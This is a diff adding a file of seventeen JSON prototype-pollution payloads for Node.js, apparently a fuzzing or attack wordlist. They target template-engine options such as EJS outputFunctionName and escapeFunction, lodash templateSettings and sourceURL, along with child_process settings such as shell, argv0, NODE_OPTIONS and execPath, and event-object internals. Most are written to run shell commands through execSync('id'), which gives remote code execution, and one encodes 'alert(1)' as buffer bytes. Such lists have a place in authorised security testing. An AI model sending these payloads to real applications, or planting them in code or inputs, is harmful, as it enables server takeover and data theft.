@@ -1,0 +1,17 @@
+{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');//"}}
+{"__proto__":{"compileDebug":true,"self":true}}
+{"__proto__":{"escapeFunction":"JSON.stringify; process.mainModule.require('child_process').execSync('id')"}}
+{"__proto__":{"NODE_OPTIONS":"--require /dev/stdin"}}
+{"__proto__":{"shell":"/proc/self/exe","argv0":"require('child_process').execSync('id').toString()"}}
+{"__proto__":{"main":"/dev/stdin"}}
+{"__proto__":{"args":["--eval","require('child_process').execSync('id').toString()"]}}
+{"__proto__":{"execPath":"/proc/self/exe"}}
+{"__proto__":{"sourceURL":"
+process.mainModule.require('child_process').execSync('id')"}}
+{"__proto__":{"templateSettings":{"evaluate":"/
+process.mainModule.require('child_process').execSync('id')//"}}}
+{"__proto__":{"opts":{"shell":true}}}
+{"__proto__":{"defaultJobOptions":{"attempts":1},"enableOfflineQueue":false}}
+{"__proto__":{"type":"Buffer","data":[97,108,101,114,116,40,49,41]}}
+{"__proto__":{"socket":{"writable":true,"write":"function(){return process.mainModule.require('child_process').execSync('id')}"}}}
+{"__proto__":{"_eventsCount":1,"_events":{"close":{"toString":"function(){return process.mainModule.require('child_process').execSync('id').toString()}","constructor":{"name":"a"}}}}}
